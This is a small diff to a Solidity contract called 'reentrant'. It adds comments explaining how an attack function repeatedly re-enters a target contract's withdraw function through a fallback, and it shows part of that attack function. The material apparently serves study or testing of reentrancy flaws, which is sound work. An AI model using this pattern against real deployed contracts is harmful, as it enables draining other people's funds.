@@ -21,7 +21,9 @@ contract reentrant {
         return;
     }
 
-
+    // The attack function calls the withdraw function from the target contract.
+    // When the target contract sends eth to this contract, the fallback function 
+    // is executed and it calls the withdraw function from the target contract one more time.
     function attack(uint _amount) public{
         (bool success,) = s_target.call(abi.encodeWithSignature("withdraw(uint256)", _amount));
         require(success, "Failed to attack");
